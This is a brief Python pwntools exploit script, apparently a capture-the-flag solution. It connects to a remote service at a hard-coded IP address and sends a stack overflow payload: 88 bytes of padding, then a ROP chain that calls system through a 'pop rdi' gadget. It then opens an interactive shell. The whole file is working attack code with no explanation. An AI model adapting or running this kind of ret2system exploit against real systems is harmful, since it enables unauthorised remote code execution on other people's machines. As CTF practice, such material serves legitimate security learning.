from pwn import *

elf=ELF("./pwn")
#p=process("./pwn")
p = remote('118.89.138.44',30009)
context.log_level="debug"
#gdb.attach(proc.pidof(p)[0])

rop=ROP(elf)

payload = "A"*88                        
payload += p64(rop.rdi[0])                
payload += p64(0x4003ef)                        
payload += p64(elf.plt['system'])         

p.sendline(payload)
p.interactive()
